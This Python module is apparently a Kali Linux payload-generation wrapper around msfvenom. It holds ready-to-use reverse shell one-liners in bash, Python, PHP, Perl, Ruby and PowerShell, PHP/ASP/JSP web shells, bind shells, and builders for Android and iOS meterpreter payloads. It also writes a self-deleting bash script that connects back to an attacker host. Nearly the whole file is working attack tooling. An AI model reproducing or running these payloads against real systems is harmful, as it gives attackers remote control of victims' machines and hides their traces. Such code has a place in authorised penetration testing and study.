"""
Payload generation and customization tools for Kali Linux
"""

import subprocess
import os
import time
import logging
from typing import Dict, List, Optional, Any
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor, as_completed


@dataclass
class PayloadConfig:
    """Configuration for payload generation"""
    payload_type: str
    target_platform: str
    target_arch: str
    lhost: str
    lport: int
    encoder: Optional[str] = None
    badchars: Optional[str] = None
    output_format: str = "raw"
    iterations: int = 1


@dataclass
class PayloadResult:
    """Result of payload generation"""
    success: bool
    payload_path: Optional[str] = None
    payload_code: Optional[str] = None
    size: int = 0
    error: Optional[str] = None


class PayloadTools:
    """Wrapper for payload generation and customization tools"""
    
    def __init__(self):
        self.logger = logging.getLogger("payload_tools")
        self.executor = ThreadPoolExecutor(max_workers=3)
        
        # Payload templates
        self.payload_templates = {
            "reverse_shell": {
                "bash": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
                "python": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
                "php": "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\"); ?>",
                "perl": "perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
                "ruby": "ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
            },
            "bind_shell": {
                "bash": "bash -i >& /dev/tcp/0.0.0.0/{lport} 0>&1",
                "python": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"0.0.0.0\",{lport}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
            },
            "web_shell": {
                "php": "<?php if(isset($_GET['cmd'])) {{ echo \"<pre>\"; system($_GET['cmd']); echo \"</pre>\"; }} ?>",
                "asp": "<%eval request(\"cmd\")%>",
                "jsp": "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>"
            },
            "powershell": {
                "reverse": "powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""
            }
        }
    
    def _run_command(self, command: List[str], timeout: int = 60) -> tuple[str, str, int]:
        """Run a command and return output, error, and return code"""
        try:
            result = subprocess.run(
                command,
                capture_output=True,
                text=True,
                timeout=timeout,
                check=False
            )
            return result.stdout, result.stderr, result.returncode
        except subprocess.TimeoutExpired:
            self.logger.warning(f"Command timed out: {' '.join(command)}")
            return "", "Command timed out", 124
        except Exception as e:
            self.logger.error(f"Command failed: {e}")
            return "", str(e), 1
    
    def generate_msfvenom_payload(self, config: PayloadConfig) -> PayloadResult:
        """Generate payload using msfvenom"""
        self.logger.info(f"Generating msfvenom payload: {config.payload_type}")
        
        try:
            # Create output file
            output_file = f"/tmp/payload_{int(time.time())}"
            
            command = [
                "msfvenom", "-p", config.payload_type,
                "-o", output_file
            ]
            
            # Add platform if specified
            if config.target_platform != "any":
                command.extend(["--platform", config.target_platform])
            
            # Add architecture if specified
            if config.target_arch != "any":
                command.extend(["-a", config.target_arch])
            
            # Add LHOST if specified
            if config.lhost:
                command.extend(["-LHOST", config.lhost])
            
            # Add LPORT if specified
            if config.lport:
                command.extend(["-LPORT", str(config.lport)])
            
            # Add encoder if specified
            if config.encoder:
                command.extend(["-e", config.encoder, "-i", str(config.iterations)])
            
            # Add badchars if specified
            if config.badchars:
                command.extend(["-b", config.badchars])
            
            # Add format
            if config.output_format != "raw":
                command.extend(["-f", config.output_format])
            
            stdout, stderr, rc = self._run_command(command, timeout=60)
            
            if rc == 0 and os.path.exists(output_file):
                # Get file size
                file_size = os.path.getsize(output_file)
                
                return PayloadResult(
                    success=True,
                    payload_path=output_file,
                    size=file_size
                )
            else:
                return PayloadResult(
                    success=False,
                    error=stderr
                )
                
        except Exception as e:
            self.logger.error(f"msfvenom payload generation failed: {e}")
            return PayloadResult(
                success=False,
                error=str(e)
            )
    
    def generate_template_payload(self, payload_type: str, config: PayloadConfig) -> PayloadResult:
        """Generate payload from template"""
        self.logger.info(f"Generating template payload: {payload_type}")
        
        try:
            # Get template
            if payload_type not in self.payload_templates:
                return PayloadResult(
                    success=False,
                    error=f"Unknown payload type: {payload_type}"
                )
            
            template_category = None
            for category, templates in self.payload_templates.items():
                if payload_type in templates:
                    template_category = category
                    break
            
            if not template_category:
                return PayloadResult(
                    success=False,
                    error=f"No template found for payload type: {payload_type}"
                )
            
            template = self.payload_templates[template_category][payload_type]
            
            # Format template with configuration
            payload_code = template.format(
                lhost=config.lhost,
                lport=config.lport
            )
            
            return PayloadResult(
                success=True,
                payload_code=payload_code,
                size=len(payload_code)
            )
            
        except Exception as e:
            self.logger.error(f"Template payload generation failed: {e}")
            return PayloadResult(
                success=False,
                error=str(e)
            )
    
    def generate_custom_payload(self, config: PayloadConfig, custom_code: str) -> PayloadResult:
        """Generate custom payload"""
        self.logger.info("Generating custom payload")
        
        try:
            # Format custom code with configuration
            payload_code = custom_code.format(
                lhost=config.lhost,
                lport=config.lport,
                platform=config.target_platform,
                arch=config.target_arch
            )
            
            # Save to file
            output_file = f"/tmp/custom_payload_{int(time.time())}"
            
            with open(output_file, 'w') as f:
                f.write(payload_code)
            
            return PayloadResult(
                success=True,
                payload_path=output_file,
                payload_code=payload_code,
                size=len(payload_code)
            )
            
        except Exception as e:
            self.logger.error(f"Custom payload generation failed: {e}")
            return PayloadResult(
                success=False,
                error=str(e)
            )
    
    def encode_payload(self, payload_path: str, encoder: str, iterations: int = 1) -> PayloadResult:
        """Encode existing payload"""
        self.logger.info(f"Encoding payload with {encoder}")
        
        try:
            if not os.path.exists(payload_path):
                return PayloadResult(
                    success=False,
                    error="Payload file not found"
                )
            
            # Create encoded output file
            encoded_file = f"{payload_path}_encoded"
            
            command = [
                "msfvenom", "-i", payload_path,
                "-e", encoder, "-i", str(iterations),
                "-o", encoded_file
            ]
            
            stdout, stderr, rc = self._run_command(command, timeout=60)
            
            if rc == 0 and os.path.exists(encoded_file):
                file_size = os.path.getsize(encoded_file)
                
                return PayloadResult(
                    success=True,
                    payload_path=encoded_file,
                    size=file_size
                )
            else:
                return PayloadResult(
                    success=False,
                    error=stderr
                )
                
        except Exception as e:
            self.logger.error(f"Payload encoding failed: {e}")
            return PayloadResult(
                success=False,
                error=str(e)
            )
    
    def generate_staged_payload(self, config: PayloadConfig) -> PayloadResult:
        """Generate staged payload"""
        self.logger.info("Generating staged payload")
        
        try:
            # Modify payload type for staging
            if not config.payload_type.endswith("/meterpreter/reverse_tcp"):
                staged_payload = config.payload_type.replace("/shell/", "/meterpreter/")
            else:
                staged_payload = config.payload_type
            
            # Create new config for staged payload
            staged_config = PayloadConfig(
                payload_type=staged_payload,
                target_platform=config.target_platform,
                target_arch=config.target_arch,
                lhost=config.lhost,
                lport=config.lport,
                encoder=config.encoder,
                badchars=config.badchars,
                output_format=config.output_format
            )
            
            return self.generate_msfvenom_payload(staged_config)
            
        except Exception as e:
            self.logger.error(f"Staged payload generation failed: {e}")
            return PayloadResult(
                success=False,
                error=str(e)
            )
    
    def generate_web_payload(self, payload_type: str, config: PayloadConfig) -> PayloadResult:
        """Generate web payload"""
        self.logger.info(f"Generating web payload: {payload_type}")
        
        try:
            if payload_type not in self.payload_templates.get("web_shell", {}):
                return PayloadResult(
                    success=False,
                    error=f"Unknown web payload type: {payload_type}"
                )
            
            template = self.payload_templates["web_shell"][payload_type]
            
            # For web shells, we don't need LHOST/LPORT
            payload_code = template
            
            return PayloadResult(
                success=True,
                payload_code=payload_code,
                size=len(payload_code)
            )
            
        except Exception as e:
            self.logger.error(f"Web payload generation failed: {e}")
            return PayloadResult(
                success=False,
                error=str(e)
            )
    
    def generate_mobile_payload(self, platform: str, config: PayloadConfig) -> PayloadResult:
        """Generate mobile payload"""
        self.logger.info(f"Generating mobile payload for {platform}")
        
        try:
            if platform.lower() == "android":
                payload_type = "android/meterpreter/reverse_tcp"
            elif platform.lower() == "ios":
                payload_type = "apple_ios/meterpreter/reverse_tcp"
            else:
                return PayloadResult(
                    success=False,
                    error=f"Unsupported mobile platform: {platform}"
                )
            
            # Create config for mobile payload
            mobile_config = PayloadConfig(
                payload_type=payload_type,
                target_platform=platform,
                target_arch="arm",
                lhost=config.lhost,
                lport=config.lport,
                encoder=config.encoder,
                badchars=config.badchars,
                output_format="apk" if platform.lower() == "android" else "ipa"
            )
            
            return self.generate_msfvenom_payload(mobile_config)
            
        except Exception as e:
            self.logger.error(f"Mobile payload generation failed: {e}")
            return PayloadResult(
                success=False,
                error=str(e)
            )
    
    def generate_network_payload(self, config: PayloadConfig) -> PayloadResult:
        """Generate network payload"""
        self.logger.info("Generating network payload")
        
        try:
            # Create network payload code
            network_payload = f"""
#!/bin/bash
# Network payload for {config.target_platform}
LHOST={config.lhost}
LPORT={config.lport}

# Create reverse shell
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1 &

# Alternative methods
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' &

# Clean up
rm -f $0
"""
            
            # Save to file
            output_file = f"/tmp/network_payload_{int(time.time())}.sh"
            
            with open(output_file, 'w') as f:
                f.write(network_payload)
            
            # Make executable
            os.chmod(output_file, 0o755)
            
            return PayloadResult(
                success=True,
                payload_path=output_file,
                payload_code=network_payload,
                size=len(network_payload)
            )
            
        except Exception as e:
            self.logger.error(f"Network payload generation failed: {e}")
            return PayloadResult(
                success=False,
                error=str(e)
            )
    
    def get_available_payloads(self, platform: str = None) -> List[str]:
        """Get list of available payloads"""
        try:
            command = ["msfvenom", "--list", "payloads"]
            
            if platform:
                command.extend(["--platform", platform])
            
            stdout, stderr, rc = self._run_command(command, timeout=30)
            
            if rc == 0:
                payloads = []
                for line in stdout.split('\n'):
                    if 'payload/' in line:
                        payload = line.split()[0].strip()
                        payloads.append(payload)
                
                return payloads
            
            return []
            
        except Exception as e:
            self.logger.error(f"Failed to get available payloads: {e}")
            return []
    
    def get_available_encoders(self) -> List[str]:
        """Get list of available encoders"""
        try:
            command = ["msfvenom", "--list", "encoders"]
            stdout, stderr, rc = self._run_command(command, timeout=30)
            
            if rc == 0:
                encoders = []
                for line in stdout.split('\n'):
                    if 'encoder/' in line:
                        encoder = line.split()[0].strip()
                        encoders.append(encoder)
                
                return encoders
            
            return []
            
        except Exception as e:
            self.logger.error(f"Failed to get available encoders: {e}")
            return []
    
    def __del__(self):
        """Cleanup thread pool"""
        if hasattr(self, 'executor'):
            self.executor.shutdown(wait=False)


# Global instance
payload_tools = PayloadTools()
